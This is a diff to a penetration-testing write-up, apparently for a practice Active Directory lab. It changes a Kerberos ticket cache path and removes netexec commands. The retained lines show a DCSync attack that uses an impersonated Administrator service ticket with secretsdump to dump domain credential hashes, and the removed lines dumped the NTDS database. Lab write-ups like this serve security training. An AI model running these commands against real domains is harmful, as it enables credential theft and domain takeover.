@@ -90,10 +90,8 @@ impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 1
 DCSync by presenting the service ticket
 
 ```bash
-export KRB5CCNAME=/home/pentester/Tools/Administrator.ccache
+export KRB5CCNAME=/workspace/Administrator.ccache
 secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
-nxc smb meereen.essos.local -k --use-kcache
-nxc smb meereen.essos.local -k --use-kcache --ntds
 ```
 
 If we specify a loot dir all the informations on the ldap are automatically dumped
@@ -125,8 +123,6 @@ impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 1
 DCSync by presenting the service ticket
 
 ```bash
-export KRB5CCNAME=/home/pentester/Tools/Administrator.ccache
+export KRB5CCNAME=/workspace/Administrator.ccache
 secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
-nxc smb meereen.essos.local -k --use-kcache
-nxc smb meereen.essos.local -k --use-kcache --ntds
 ```
